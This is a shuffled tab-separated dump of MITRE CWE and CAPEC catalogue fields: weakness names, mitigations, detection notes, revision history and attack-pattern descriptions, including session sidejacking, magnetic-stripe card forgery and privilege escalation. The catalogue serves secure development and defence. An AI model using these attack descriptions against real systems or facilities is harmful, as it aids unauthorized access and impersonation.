9445	35	MITRE
25036	91	Architecture and Design
15581	39	2014-07-30
19937	40	The application does not properly validate data before storing in the database
22274	71	2014
21774	62	updated Relationships, Taxonomy_Mappings
17005	28	CWE Content Team
12138	101	CAPEC Content Team
8101	103	Primary
10082	28	CWE Content Team
16753	78	High
25222	45	Variant
10127	39	2014-06-23
16379	89	Detailed
17940	62	updated Relationships, Taxonomy_Mappings
22261	39	2008-10-14
24728	56	ChildOf
8749	21	PLOVER
23127	28	CWE Content Team
12754	28	Sean Eidemiller
8486	85	276
15626	23	This attack targets command-line utilities available in a number of shells. An attacker can leverage a vulnerability found in a command-line utility to escalate privilege to root.
15027	85	549
21211	45	Class
11550	63	Read Application Data
19334	42	Suppress large numbers of duplicate log messages and replace them with periodic summaries. For example, syslog may include an entry that states "last message repeated X times" when recording repeated events.
8927	70	Java Web Start argument injection vulnerability
14106	39	2015-12-07
9079	91	Architecture and Design
21837	39	2012-05-11
9399	35	MITRE
10538	79	Integrity
12741	28	CWE Content Team
10012	90	C++
18522	50	Turn off JavaScript, Flash and disable CSS.
24857	34	A developer may introduce authorization weaknesses because of a lack of understanding about the underlying technologies. For example, a developer may assume that attackers cannot modify certain inputs such as headers or cookies.
25064	28	CWE Content Team
20795	63	DoS: Crash, Exit, or Restart
6795	39	2008-07-01
9747	103	Primary
18123	62	updated Relationships
12622	103	Primary
12559	101	CAPEC Content Team
14257	90	Language-Independent
22759	39	2012-05-11
8815	28	CWE Content Team
7795	62	updated Relationships
18365	95	[Fetch samples] An attacker fetches many samples of a session ID. This may be through legitimate access (logging in, legitimate connections, etc) or just systematic probing.
15378	39	2017-01-19
20467	62	updated Description
11399	45	Base
22357	47	Gain Privileges
13859	39	2011-03-29
12704	39	2010-04-05
15626	50	Do not unnecessarily expose services.
12419	74	1
17423	28	CWE Content Team
23210	101	CAPEC Content Team
23780	31	1000
16312	53	The MITRE Corporation
6893	62	updated Relationships
7825	61	Draft
18893	55	CAPEC Content Team
20384	102	ChildOf
19120	28	CWE Content Team
11504	76	2019-04-04
12675	28	CWE Content Team
24449	88	Improper Validation of Array Index
8529	45	Base
21355	24	MITRE
13505	35	MITRE
22098	31	699
6599	81	Access Control
9830	90	C++
14557	85	322
21098	81	Access Control
7177	28	CWE Content Team
11547	103	Primary
11450	35	MITRE
13503	35	MITRE
11116	62	updated Name
16802	59	Updated @Abstraction
15585	62	updated Common_Consequences
14998	100	The MITRE Corporation
20428	75	These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules. However, manual efforts might not achieve desired code coverage within limited time constraints.
11574	103	Primary
10969	63	Gain Privileges or Assume Identity
11990	28	CWE Content Team
6565	31	1000
16893	76	2018-07-31
9133	35	MITRE
19933	39	2008-07-01
9362	71	2014
14346	39	2011-03-29
20450	92	Explore
18818	35	MITRE
15013	39	2012-10-30
7031	86	http://www.cgisecurity.com/lib/studyinscarlet.txt
7436	50	An organization should provide regular, robust cybersecurity training to its employees to prevent social engineering attacks.
23553	31	1000
11369	103	Primary
12266	56	ChildOf
16373	39	2008-09-08
23379	72	When an unexpected sign extension occurs in code that operates directly on memory buffers, such as a size value or a memory index, then it could cause the program to write or read outside the boundaries of the intended buffer. If the numeric value is associated with an application-level resource, such as a quantity or price for a product in an e-commerce site, then the sign extension could produce a value that is much higher (or lower) than the application's allowable range.
10889	24	MITRE
15267	28	CWE Content Team
21102	103	Primary
23868	39	2008-08-15
15972	31	699
8824	62	updated Potential_Mitigations
15180	74	3
19590	39	2009-05-27
22704	39	2011-06-01
6171	100	The MITRE Corporation
8047	62	updated Common_Consequences
18912	44	High
15139	85	115
10258	63	Other
23528	69	Incomplete
24176	94	Successful attacks that influence the target via framing into performing an action or sharing sensitive information can result in a variety of consequences that negatively affect the confidentiality of an application or system.
14673	28	CWE Content Team
14888	23	A handler is not available or implemented.
22782	81	Integrity
5729	62	updated Potential_Mitigations, Related_Attack_Patterns
16120	35	MITRE
18266	35	MITRE
20357	39	2008-10-14
17527	74	1
19165	100	The MITRE Corporation
22817	35	Cigital
11479	43	Simple
6256	47	Modify Data
24248	62	updated Demonstrative_Examples, Description, Potential_Mitigations
8940	103	Primary
9998	62	updated Description
7445	46	The shortcut (file with the .lnk extension) can permit an attacker to read/write a file that they originally did not have permissions to access.
18678	49	2010
15505	39	2011-06-01
6094	59	Updated Attack_Phases
24404	39	2008-09-08
20395	39	2012-05-11
13051	70	Simple Object Access Protocol (SOAP) 1.1
8905	28	CWE Content Team
23863	35	MITRE
19277	103	Primary
16766	69	Draft
11628	26	Implementation
6830	28	CWE Content Team
13609	86	http://insecure.org/news/P55-07.txt
7859	50	Implementation: Integrity monitoring for configuration files
19365	39	2011-06-01
9484	26	Architecture and Design
16751	63	Modify Memory
7615	79	Authorization
14786	62	updated Time_of_Introduction
10216	23	The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as comment delimiters when they are sent to a downstream component.
16035	91	Architecture and Design
21201	62	updated Description, Name, Potential_Mitigations, Relationships
11324	79	Confidentiality
25262	35	MITRE
13231	55	CAPEC Content Team
15147	56	ChildOf
22080	39	2017-11-08
6669	35	MITRE
23203	39	2011-06-01
10368	35	MITRE
22006	47	Bypass Protection Mechanism
6644	80	To load malicious script into open, e.g. world writable directory
15680	35	MITRE
15891	35	MITRE
12779	31	699
24482	35	Cigital
13673	46	If a web product does not properly protect assumed-immutable values from modification in hidden form fields, parameters, cookies, or URLs, this can lead to modification of critical data. Web applications often mistakenly make the assumption that data passed to the client in hidden fields or cookies is not susceptible to tampering. Improper validation of data that are user-controllable can lead to the application processing incorrect, and often malicious, input.             For example, custom cookies commonly store session data or persistent data across sessions. This kind of session data is normally involved in security related decisions on the server side, such as user authentication and access control. Thus, the cookies might contain sensitive data such as user credentials and privileges. This is a dangerous practice, as it can often lead to improper reliance on the value of the client-provided cookie by the server side application.
10224	91	Implementation
20548	69	Draft
13188	28	CWE Content Team
12155	28	CWE Content Team
13945	28	CWE Content Team
8123	50	Make sure your web server is up-to-date with all patches to protect against known vulnerabilities.                Insure that the file permissions in directories on the web server from which files can be execute is set to the "least privilege" settings, and that those directories contents is controlled by a whitelist.
24057	35	MITRE
19582	42	Fully specify which encodings are required by components that will be communicating with each other.
11354	28	CWE Content Team
8189	39	2011-06-01
9767	102	ChildOf
5711	52	This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.                   Initialization problems may be detected with a stress-test by calling the software simultaneously from a large number of threads or processes, and look for evidence of any unexpected behavior. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.
19113	39	2008-07-01
15235	69	Incomplete
9457	50	Implementation: Make use of indirect references passed in URL parameters instead of file names
18674	23	The software, when opening a file or directory, does not sufficiently account for when the name is associated with a hard link to a target that is outside of the intended control sphere. This could allow an attacker to cause the software to operate on unauthorized files.
24984	42	Use an abstraction library to abstract away risky APIs. Not a complete solution.
16841	56	ChildOf
15989	28	CWE Content Team
8092	39	2017-01-19
20201	28	CWE Content Team
7059	39	2014-07-30
9883	28	CWE Content Team
17014	28	CWE Content Team
14089	26	Operation
10728	62	updated Relationships
21526	55	CAPEC Content Team
5734	56	ChildOf
8920	48	11
9146	39	2014-07-30
25399	28	CWE Content Team
9886	43	Simple
7434	39	2008-09-08
14596	39	2008-11-24
20458	76	2017-01-09
13653	61	Draft
7271	62	updated Common_Consequences
21362	62	updated Relationships, Taxonomy_Mappings
24156	28	CWE Content Team
23366	59	Updated Activation_Zone, Attack_Phases, Description, Description Summary, Examples-Instances, Injection_Vector, Methods_of_Attack, Payload, Related_Attack_Patterns, Typical_Likelihood_of_Exploit, Typical_Severity
21663	56	ChildOf
16521	76	2017-05-01
18281	81	Confidentiality
24367	31	1000
23403	63	Unexpected State
24999	56	ChildOf
6105	39	2011-09-13
14420	35	MITRE
21783	45	Variant
18500	39	2011-06-01
22908	39	2009-05-27
18256	35	MITRE
24165	62	updated Demonstrative_Examples, Relationships
9687	104	637
12678	28	CWE Content Team
20510	47	Bypass Protection Mechanism
7408	28	CWE Content Team
18966	28	Sean Eidemiller
7238	35	Cigital
21139	104	338
8358	28	CWE Content Team
10971	81	Availability
17099	28	Eric Dalci
16037	58	SSL (Secure Socket Layer) provides data confidentiality and integrity to HTTP. By encrypting HTTP messages, SSL protects from attackers eavesdropping or altering message contents.
20969	28	CWE Content Team
17410	35	MITRE
21659	39	2008-07-01
13087	39	2019-06-20
12221	78	Very High
10868	91	Installation
24447	69	Draft
9230	103	Primary
19041	54	High
12785	42	Consider a PRNG that re-seeds itself as needed from high-quality pseudo-random output, such as hardware devices.
16499	88	Incomplete Cleanup
23759	39	2011-03-29
14159	39	2012-05-11
20566	56	ChildOf
12606	39	2019-01-03
20606	35	Cigital
7583	23	The software does not properly handle when an input contains Unicode encoding.
10992	39	2012-05-11
20685	35	MITRE
12436	31	1000
6393	28	CWE Content Team
9836	28	CWE Content Team
14675	85	267
8546	104	1097
7390	66	Meltdown
14258	28	CWE Content Team
18934	66	Top 25 Series - Rank 10 - Missing Encryption of Sensitive Data
22393	69	Incomplete
11931	70	Cross-Domain Search Timing
19569	81	Other
9682	45	Variant
8509	39	2009-10-29
9523	78	High
15735	39	2010-12-13
6858	81	Integrity
19755	51	2014-06-23
21772	91	Operation
7073	28	CWE Content Team
8449	39	2012-05-11
24144	39	2019-01-03
14652	39	2019-06-20
8573	56	ChildOf
22245	39	2008-09-08
7262	39	2012-05-11
11761	35	MITRE
21453	31	1000
16936	103	Primary
11351	28	CWE Content Team
20949	35	MITRE
20632	35	MITRE
14163	28	CWE Content Team
14832	89	Standard
23076	36	http://www.unatekconference.com/images/pdfs/presentations/Yee.pdf
22751	23	The software provides different responses to incoming requests in a way that allows an actor to determine system state information that is outside of that actor's control sphere.
24268	35	MITRE
11385	28	CWE Content Team
12046	103	Primary
25391	103	Primary
9819	35	MITRE
17756	97	TCP Timestamp Probe
15489	28	CWE Content Team
12609	35	MITRE
16248	48	02
6610	91	Implementation
17465	101	CAPEC Content Team
24778	30	Mark O'Neill
9943	62	updated Potential_Mitigations
21695	62	updated Causal_Nature, References, Relationships, Taxonomy_Mappings
20318	43	Simple
7986	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Source code Weakness Analyzer                            Context-configured Source Code Weakness Analyzer
14660	103	Primary
11582	91	Implementation
24220	28	CWE Content Team
6316	56	ChildOf
15193	35	MITRE
17759	26	Implementation
21013	102	ChildOf
19468	39	2008-09-08
15529	55	CAPEC Content Team
13599	35	MITRE
19435	35	MITRE
18230	31	1003
8056	39	2011-06-01
8358	35	MITRE
17211	28	CWE Content Team
14208	63	Read Files or Directories
19290	100	The MITRE Corporation
7919	63	DoS: Instability
14246	56	ChildOf
9615	39	2012-10-30
21996	84	10
20202	28	CWE Content Team
14052	69	Incomplete
12489	24	MITRE
22017	81	Access Control
16053	88	Addition of Data Structure Sentinel
12591	47	Gain Privileges
6785	88	Unlock of a Resource that is not Locked
23902	33	David Litchfield
17261	31	699
17859	26	Implementation
18111	62	updated Alternate_Terms, Common_Consequences, Detection_Factors, Potential_Mitigations, References, Related_Attack_Patterns, Relationships, Taxonomy_Mappings, Type
22077	104	28
17271	62	updated Demonstrative_Examples, References, Relationships
9691	69	Draft
20116	51	2014-06-23
20618	40	A variable consumed by the application server is exposed to the client.
11013	28	CWE Content Team
20491	39	2008-11-24
25384	28	CWE Content Team
23661	101	CAPEC Content Team
5838	46	The J2EE standard forbids the direct management of connections. It requires that applications use the container's resource management facilities to obtain connections to resources. Every major web application container provides pooled database connection management as part of its resource management framework. Duplicating this functionality in an application is difficult and error prone, which is part of the reason it is forbidden under the J2EE standard.
25238	53	The MITRE Corporation
23486	28	CWE Content Team
25147	42	Always check to see if you have successfully accessed a resource or system functionality, and use proper error handling if it is unsuccessful. Do this even when you are operating in a highly privileged mode, because errors or environmental conditions might still cause a failure. For example, environments with highly granular permissions/privilege models, such as Windows or Linux capabilities, can cause unexpected failures.
20054	81	Integrity
9153	81	Confidentiality
13160	35	MITRE
15812	39	2014-07-30
14404	33	Aleph One
22845	39	2011-06-01
23797	31	1000
11883	62	updated Related_Attack_Patterns
7995	88	Incomplete Documentation of Program Execution
16369	63	Execute Unauthorized Code or Commands
13184	51	2014-06-23
12042	35	MITRE
20397	35	MITRE
13625	103	Primary
17004	43	Simple
18281	63	Execute Unauthorized Code or Commands
25015	28	CWE Content Team
19873	96	2009-10-21
19262	79	Availability
7467	45	Base
17634	35	MITRE
14913	103	Primary
7764	90	Language-Independent
13529	25	Low
17643	39	2013-07-17
7172	62	updated Relationships
12690	21	7 Pernicious Kingdoms
17053	42	Ensure that protocols have specific limits of scale placed on them.
16450	35	MITRE
14047	62	updated Other_Notes, Potential_Mitigations
22253	56	ChildOf
21741	59	Updated Attacker_Skills_or_Knowledge_Required
23406	104	1098
20313	28	CWE Content Team
23605	35	MITRE
21783	88	PHP External Variable Modification
9597	79	Confidentiality
19476	28	CWE Content Team
11284	23	An adversary may attempt to block indicators from leaving the host machine. In the case of network based reporting of indicators, an adversary may block traffic associated with reporting to prevent central station analysis. This may be accomplished by many means such as stopping a local process to creating a host-based firewall rule to block traffic to a specific server.
21647	102	ChildOf
14951	62	updated Applicable_Platforms
13232	34	In cases such as localization and internationalization, the language-specific message repositories could be an avenue for exploitation, but the format string issue would be resultant, since attacker control of those repositories would also allow modification of message length, format, and content.
21601	76	2019-04-04
12762	45	Variant
23470	57	Primary
6586	62	updated Relationships
16191	62	updated Potential_Mitigations
14619	59	Updated Related_Attack_Patterns
13513	43	Simple
18771	92	Exploit
14828	42	Use sizeof() on the appropriate data type to avoid CWE-467.
22425	35	MITRE
17676	90	Language-Independent
18099	39	2011-06-01
15912	62	updated Applicable_Platforms, Likelihood_of_Exploit, Modes_of_Introduction, Relationships
24140	69	Draft
12467	62	updated Relationships, Other_Notes, Taxonomy_Mappings
16875	103	Primary
11250	39	2009-07-27
8767	28	CWE Content Team
22832	39	2017-11-08
24688	56	ChildOf
6321	66	C++ Virtual Destructors: How to Avoid Memory Leaks
18892	62	updated Relationships
24995	39	2012-05-11
11403	62	updated Common_Consequences
17090	103	Primary
25159	103	Primary
19306	25	Medium
8323	39	2017-11-08
7982	35	MITRE
19509	102	ChildOf
9364	28	CWE Content Team
8207	26	Implementation
7585	62	updated Potential_Mitigations, References, Relationships, Taxonomy_Mappings
17973	40	The victim must use email or removable media from systems running the IDE (or systems adjacent to the IDE systems).
24490	70	The OWASP Application Security Desk Reference
24484	39	2017-11-08
19864	42	Protect important client controllable tokens/parameters for integrity using PKI methods (i.e. digital signatures) or other means, and checks for integrity on the server side.
13255	28	Eric Dalci
18132	35	MITRE
18267	101	CAPEC Content Team
25096	49	2007
7861	88	Path Traversal: '../filedir'
18564	86	https://www.immuniweb.com/vulnerability/null-pointer-dereference.html
25323	35	MITRE
13533	79	Availability
21218	62	updated Relationships
25170	69	Draft
16516	28	CWE Content Team
14990	23	Inner classes are translated into classes that are accessible at package scope and may expose code that the programmer intended to keep private to attackers.
9157	39	2010-06-21
23299	62	updated Maintenance_Notes, Relationships
19237	61	Stable
12256	28	CWE Content Team
24315	80	Determine if Kerberos authentication is used on the server.
16918	63	Read Application Data
23252	88	Creation of Immutable Text Using String Concatenation
19834	62	updated Applicable_Platforms, Causal_Nature, Likelihood_of_Exploit, Relationships, Taxonomy_Mappings
16707	35	MITRE
16500	62	updated Relationships
20518	35	MITRE
23906	67	High
13971	28	CWE Content Team
20510	79	Authorization
9515	56	ChildOf
15248	23	The program uses double-checked locking to access a resource without the overhead of explicit synchronization, but the locking is insufficient.
17833	28	CWE Content Team
6557	28	CWE Content Team
17466	23	An attacker analyzes the data on two or more magnetic strip cards and is able to generate new cards containing valid sequences that allow unauthorized access and/or impersonation of individuals. Often, magnetic strip encoding methods follow a common format for a given system laid out in up to three tracks. A single card may allow access to a corporate office complex shared by multiple companies. By analyzing how the data is stored on a card, it is also possible to create valid cards via brute-force attacks. For example, a single card can grant access to a building, a floor, and a suite number. Reading and analyzing data on multiple cards, then performing a difference analysis between data encoded on three different cards, can reveal clues as to how to generate valid cards that grant access to restricted areas of a building or suites/rooms within that building. Data stored on magstripe cards is often unencrypted, therefore comparing which data changes when two or more cards are analyzed can yield results that aid in determining the structure of the card data. A trivial example would be a common system data format on a data track which binary encodes the suite number of a building that a card will open. By creating multiple cards with differing binary encoded segments it becomes possible to enter unauthorized areas or pass through checkpoints giving the electronic ID of other persons.
18494	28	CWE Content Team
18633	39	2019-01-03
6726	45	Base
19891	57	Indirect
9093	56	ChildOf
22939	102	ChildOf
21891	56	ChildOf
22021	62	updated Relationships
9670	85	329
22159	62	updated Potential_Mitigations
21252	35	MITRE
6828	79	Authorization
6024	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Focused Manual Spotcheck - Focused manual analysis of source                            Manual Source Code Review (not inspections)
9881	35	MITRE
6136	62	updated Related_Attack_Patterns
16730	102	ChildOf
19610	27	None: No specialized resources are required to execute this type of attack.
18455	28	CWE Content Team
10893	28	CWE Content Team
11316	43	Simple
10717	39	2008-09-08
19714	62	updated Affected_Resources, Causal_Nature, Modes_of_Introduction, Relationships
16206	35	MITRE
18502	39	2012-05-11
16776	28	CWE Content Team
9843	57	Indirect
8607	35	MITRE
11415	28	CWE Content Team
22189	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Methods_of_Attack, References, Related_Attack_Patterns, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit
9719	35	MITRE
11406	31	1000
25293	85	29
14611	97	Removing/short-circuiting 'Purse' logic: removing/mutating 'cash' decrements
24864	35	MITRE
17923	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Database Scanners                                                                     Cost effective for partial coverage:                                                                           Web Application Scanner                            Web Services Scanner
5795	39	2008-07-01
12170	62	updated Common_Consequences
18114	35	MITRE
18498	63	Alter Execution Logic
10895	28	CWE Content Team
21471	43	Simple
18190	21	PLOVER
13255	62	updated Time_of_Introduction
22216	62	updated Relationships
19935	90	Language-Independent
18946	79	Authorization
8153	62	updated Related_Attack_Patterns
23489	66	Top 25 series - Rank 1 - Cross Site Scripting
7124	31	699
18527	81	Other
12635	35	MITRE
13373	56	ChildOf
12077	94	Run Arbitrary Code
23375	43	Simple
23989	92	Explore
23148	62	updated Relationships
20565	56	ChildOf
11639	35	MITRE
24068	36	http://doc.bughunter.net/format-string/exploit-fs.html
11507	28	CWE Content Team
15046	35	MITRE
23791	101	CAPEC Content Team
24272	91	Architecture and Design
13736	89	Standard
17252	35	MITRE
12038	26	Architecture and Design
16474	28	CWE Content Team
9907	39	2012-05-11
22160	62	updated Relationships, Taxonomy_Mappings
25231	79	Authentication
9784	35	MITRE
6546	94	Through local code inclusion, the adversary compromises the integrity of the application.
12931	47	Read Data
9969	42	Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.                   For example, consider using authorization frameworks such as the JAAS Authorization Framework [REF-233] and the OWASP ESAPI Access Control feature [REF-45].
21047	39	2013-02-21
20888	91	Implementation
22784	62	updated Relationships
12283	39	2011-09-13
8256	102	ChildOf
13088	62	updated Potential_Mitigations
7499	56	ChildOf
17528	69	Incomplete
5944	56	ChildOf
20400	30	A. Krishnamurthy
13683	94	Run Arbitrary Code
10852	21	CWE Content Team
13751	81	Integrity
15153	81	Access Control
21310	23	The product behaves differently than other products like it, in a way that is observable to an attacker and exposes security-relevant information about which product is being used.
24571	39	2008-09-08
24277	42	Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible.
12751	91	Implementation
20391	34	COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.
7939	91	Implementation
16563	73	Look for HTML meta tags that could be injectable
22588	90	C++
8948	28	Eric Dalci
12551	88	Improper Link Resolution Before File Access ('Link Following')
9773	62	updated Common_Consequences
6431	62	updated Related_Attack_Patterns, Relationships, Type
13521	63	Unexpected State
11166	62	updated Potential_Mitigations
17616	39	2008-08-15
10537	39	2012-05-11
10589	103	Primary
9227	90	Language-Independent
19152	85	116
15064	62	updated Description, Relationships, Other_Notes
11274	35	MITRE
23308	35	MITRE
11041	46	The Java Language Specification states that it is a good practice for a finalize() method to call super.finalize().
22899	103	Primary
6335	62	updated Relationships
12000	56	ChildOf
6025	35	MITRE
25423	51	2014-06-23
11422	35	MITRE
9752	43	Simple
16301	101	CAPEC Content Team
13903	91	Implementation
18597	91	Operation
16992	91	Implementation
16041	79	Confidentiality
19350	62	updated Potential_Mitigations
18569	62	updated Potential_Mitigations
24524	100	The MITRE Corporation
12422	67	Medium
16204	62	updated Demonstrative_Examples
13862	91	Architecture and Design
24842	56	ChildOf
12389	24	MITRE
18811	78	Medium
21783	43	Simple
6936	23	Session sidejacking takes advantage of an unencrypted communication channel between a victim and target system. The attacker sniffs traffic on a network looking for session tokens in unencrypted traffic. Once a session token is captured, the attacker performs malicious actions by using the stolen token with the targeted application to impersonate the victim. This attack is a specific method of session hijacking, which is exploiting a valid session token to gain unauthorized access to a target system or information. Other methods to perform a session hijacking are session fixation, cross-site scripting, or compromising a user or server machine and stealing the session token.
14564	28	CWE Content Team
24804	69	Incomplete
25012	40	The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.
24573	103	Primary
9845	104	591
15892	42	Follow the principle of least privilege when assigning access rights to entities in a software system.                   Denying access to a file can prevent an attacker from replacing that file with a link to a sensitive file. Ensure good compartmentalization in the system to provide protected areas that can be trusted.
24798	88	Improper Control of Document Type Definition
8673	73	Common decoding methods. The attacker applies methods to decode such encodings and compressions as Base64, unzip, unrar, RLE decoding, gzip decompression and so on.
22633	28	CWE Content Team
13269	39	2012-05-11
20266	28	CWE Content Team
16775	100	The MITRE Corporation
9930	53	The MITRE Corporation
18631	39	2014-06-23
7418	35	MITRE
10643	28	CWE Content Team
18620	28	CWE Content Team
13791	62	updated Potential_Mitigations
14430	63	Read Application Data
11437	39	2009-12-28
18777	101	CAPEC Content Team
10967	28	Sean Eidemiller
13261	90	Language-Independent
10461	91	Implementation
6780	39	2013-07-17
14116	28	CWE Content Team
13770	46	In some contexts, a system executing with elevated permissions will hand off a process/file/etc. to another process or user. If the privileges of an entity are not reduced, then elevated privileges are spread throughout a system and possibly to an attacker.
24652	28	CWE Content Team
6621	59	Updated Activation_Zone, Attack_Phases, Attack_Prerequisites, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact
8050	81	Access Control
23894	53	The MITRE Corporation
15229	28	CWE Content Team
23849	76	2017-01-09
7719	25	Medium
9615	28	CWE Content Team
18321	31	699
21215	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
8055	28	CWE Content Team
19555	35	MITRE
18297	100	The MITRE Corporation
8683	35	Cigital
19538	45	Variant
7459	103	Primary
15128	28	Eric Dalci
24126	28	CWE Content Team
5762	63	Read Application Data
12191	42	Carefully check each input parameter against a rigorous positive specification (whitelist) defining the specific characters and format allowed. All input should be neutralized, not just parameters that the user is supposed to specify, but all data in the request, including tag attributes, hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. We often encounter data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.
22112	85	197
23707	28	CWE Content Team
19683	35	MITRE
10371	39	2012-05-11
15839	35	MITRE
22003	103	Primary
14137	28	CWE Content Team
18697	100	The MITRE Corporation
17738	60	18
20762	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
6374	28	CWE Content Team
12563	62	updated Common_Consequences
9466	28	CWE Content Team
17054	39	2014-07-30
8589	28	CWE Content Team
20080	35	MITRE
23733	28	CWE Content Team
11645	54	High
15093	21	7 Pernicious Kingdoms
11493	28	CWE Content Team
21479	35	MITRE
18783	28	Eric Dalci
5755	35	MITRE
13531	35	MITRE
12157	39	2008-09-08
6045	92	Exploit
13519	61	Draft
24251	35	MITRE
16686	47	Read Data
6809	27	The adversary must have the ability to communicate with the application over the network.
17348	26	Implementation
15077	51	2014-06-23
6540	62	updated Common_Consequences
19416	35	MITRE
23455	69	Draft
21260	28	CWE Content Team
12363	33	Anibal Sacco
17181	100	The MITRE Corporation
10808	28	CWE Content Team
6357	39	2008-11-24
20256	35	MITRE
5894	35	MITRE
9290	39	2015-12-07
17704	35	MITRE
18403	62	updated Potential_Mitigations, References
6377	35	MITRE
18881	86	http://blog.modsecurity.org/2008/07/do-you-know-how.html
12111	100	The MITRE Corporation
15626	54	High
15270	62	updated Potential_Mitigations, References
20270	35	MITRE
19152	23	An adversary actively probes the target in a manner that is designed to solicit information that could be leveraged for malicious purposes. This is achieved by exploring the target via ordinary interactions for the purpose of gathering intelligence about the target, or by sending data that is syntactically invalid or non-standard in an attempt to produce a response that contains the desired data. As a result of these interactions, the adversary is able to obtain information from the target that aids the attacker in making inferences about its security, configuration, or potential vulnerabilities. Examplar exchanges with the target may trigger unhandled exceptions or verbose error messages that reveal information like stack traces, configuration information, path information, or database design. This type of attack also includes the manipulation of query strings in a URI to produce invalid SQL queries, or by trying alternative path values in the hope that the server will return useful information.
17861	35	MITRE
10796	53	The MITRE Corporation
8985	73	Create many consecutive requests to the server. Some of which must be malformed.
25288	67	Medium
17299	35	MITRE
5750	63	Read Application Data
19937	40	Malicious data is used on the backend as a command line argument
9130	59	Updated Related_Weaknesses
25257	31	1000
10388	80	An attacker can simply overflow a buffer by inserting a long string into an attacker-modifiable injection vector. The result can be a DoS.
12621	63	Gain Privileges or Assume Identity
24444	62	updated Relationships
20222	43	Simple
24810	103	Primary
21488	52	This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives.                   Automated static analysis generally does not account for environmental considerations when reporting out-of-bounds memory operations. This can make it difficult for users to determine which warnings should be investigated first. For example, an analysis tool might report buffer overflows that originate from command line arguments in a program that is not expected to run with setuid or other special privileges.
21028	39	2011-06-01
8004	69	Draft
8336	28	CWE Content Team
23251	81	Other
8164	62	updated Potential_Mitigations
17100	27	Some web development tools to put up a fake website.
18178	28	CWE Content Team
23065	95	[Survey the target] Using a browser or an automated tool, an attacker records all instances of web services to process XML requests.
11433	104	684
8091	39	2008-07-01
20301	94	Run Arbitrary Code
20091	35	MITRE
16394	39	2017-11-08
16322	39	2009-05-27
11786	35	MITRE
24798	46	As DTDs are processed, they might try to read or include files on the machine performing the parsing. If an attacker is able to control the DTD, then the attacker might be able to specify sensitive resources or requests or provide malicious content.             For example, the SOAP specification prohibits SOAP messages from containing DTDs.
19388	56	ChildOf
15054	39	2010-06-21
19818	40	An application does not perform sufficient input validation to ensure that user-controllable data is safe for an XML parser.
17780	39	2019-06-20
8484	62	updated Relationships
7569	102	ChildOf
8198	80	Reverse engineering and cryptanalysis of signature generation algorithm implementation and random number generation
19065	76	2018-07-31
22567	39	2008-09-08
16235	40	The operating system must support a file system that allows for alternate data storage for a file.
7479	63	Modify Application Data
14264	35	MITRE
23223	91	Implementation
22701	50	Commercial defensive technology to detect and alert to any attempts to modify mobile technology data flows or to inject new data into existing data flows and signaling data.
21205	73	Use a spidering tool to follow and record attempts on well-known URLs.
13570	25	High
16744	103	Primary
22609	59	Updated Activation_Zone, Architectural_Paradigms, Injection_Vector, Payload, Payload_Activation_Impact, References, Technical_Context
15796	35	MITRE
22196	33	Matthias Kaiser
6550	100	The MITRE Corporation
14755	63	Other
7037	31	699
22035	59	Updated Related_Attack_Patterns
16636	31	1000
18251	28	CWE Content Team
15367	28	CWE Content Team
15809	62	updated Detection_Factors, Potential_Mitigations
11782	72	The severity of the exposed debug application will depend on the particular instance. At the least, it will give an attacker sensitive information about the settings and mechanics of web applications on the server. At worst, as is often the case, the debug application will allow an attacker complete control over the web application and server, as well as confidential information that either of these access.
10058	28	CWE Content Team
24133	46	If integrity check values or "checksums" are omitted from a protocol, there is no way of determining if data has been corrupted in transmission. The lack of checksum functionality in a protocol removes the first application-level check of data that can be used. The end-to-end philosophy of checks states that integrity checks should be performed at the lowest level that they can be completely implemented. Excluding further sanity checks and input validation performed by applications, the protocol's checksum is the most important level of checksum, since it can be performed more completely than at any previous level and takes into account entire messages, as opposed to single packets.
14796	39	2008-08-15
15867	51	2014-06-23
16559	39	2009-10-29
23361	35	MITRE
18085	72	The data which were produced as a result of a function call could be in a bad state upon return. If the return value is not checked, then this bad data may be used in operations, possibly leading to a crash or other unintended behaviors.
12150	103	Primary
16039	56	ChildOf
14523	62	updated Potential_Mitigations, Time_of_Introduction
12384	104	304
13661	26	Architecture and Design
10501	35	MITRE
16123	47	Unreliable Execution
17049	23	The software utilizes multiple threads or processes to allow temporary access to a shared resource that can only be exclusive to one process at a time, but it does not properly synchronize these actions, which might cause simultaneous accesses of this resource by multiple threads or processes.
23234	62	updated Type
6641	42	While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).
16217	26	Architecture and Design
16392	31	699
20729	42	Use an abstraction library to abstract away risky APIs. Not a complete solution.
8000	35	Cigital
13293	88	Numeric Truncation Error
13770	67	High
10535	31	1000
